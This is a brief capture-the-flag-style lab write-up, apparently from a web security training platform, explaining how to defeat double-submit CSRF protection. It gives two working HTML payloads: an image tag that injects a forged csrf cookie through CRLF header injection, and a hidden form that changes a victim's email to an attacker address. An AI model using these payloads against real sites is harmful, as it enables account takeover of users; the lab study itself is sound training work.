### ðŸ§ª Lab Summary: CSRF Token Duplicated in Cookie

- The server uses the **double submit technique**:
  - A CSRF token is stored in a cookie (`csrf=fake`)
  - The same token is expected in the request body (`csrf=fake`)
- The server simply **compares the two values**â€”if they match, the request is accepted.
- But the cookie is **not `HttpOnly`**, and the site has a **reflected input vulnerability** that lets you inject a `Set-Cookie` header.

---

### ðŸ”¥ Exploit Strategy

1. **Inject a forged CSRF cookie** into the victimâ€™s browser using a reflected input:

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" 
     onerror="document.forms[0].submit()" />
```

2. **Craft a CSRF PoC form** that uses the same token in the body:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.kav" />
  <input type="hidden" name="csrf" value="fake" />
</form>
```

3. When the victim visits the page:
   - The browser sets the `csrf=fake` cookie.
   - The form submits with `csrf=fake` in the body.
   - The server compares them â†’ âœ… Match â†’ ðŸš¨ Email changed.

---
